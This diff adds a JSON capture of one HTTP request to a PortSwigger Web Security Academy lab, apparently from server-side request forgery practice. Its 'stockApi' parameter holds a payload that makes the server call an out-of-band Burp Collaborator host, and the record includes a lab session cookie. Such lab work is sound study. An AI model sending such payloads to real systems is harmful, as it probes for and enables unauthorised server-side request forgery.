@@ -1,0 +1,33 @@
+{
+    "URL": "https://0a88000d0358300282c8011900c700fa.web-security-academy.net/product/stock",
+    "Method": "POST",
+    "HTTP Version": "Unknown",
+    "Request Headers": {
+        "host": "0a88000d0358300282c8011900c700fa.web-security-academy.net",
+        "accept-encoding": "gzip, deflate, br",
+        "accept": "*/*",
+        "accept-language": "en-US;q=0.9,en;q=0.8",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
+        "connection": "close",
+        "cache-control": "max-age=0",
+        "referer": "https://0a88000d0358300282c8011900c700fa.web-security-academy.net/product?productId=20",
+        "content-type": "application/x-www-form-urlencoded",
+        "cookie": "session=E68xsQIkiZ3Hs94qZS0vPFb1KQSRatq7",
+        "content-length": "62"
+    },
+    "Response Headers": {
+        "server": "Burp Collaborator https://burpcollaborator.net/",
+        "x-collaborator-version": "4",
+        "content-type": "text/html",
+        "x-frame-options": "SAMEORIGIN",
+        "content-length": "55"
+    },
+    "URL Parameters": {},
+    "HTML Content": "<html><body>yc0qbbv93o9tfovvzc1ye5zjjgjgz</body></html>",
+    "POST Body": "stockApi=%2F%2Foldu523lmo3zzg03w6zdjmp82z8qwhk6.oastify.com%2F",
+    "POST Parameters": {
+        "stockApi": [
+            "//oldu523lmo3zzg03w6zdjmp82z8qwhk6.oastify.com/"
+        ]
+    }
+}
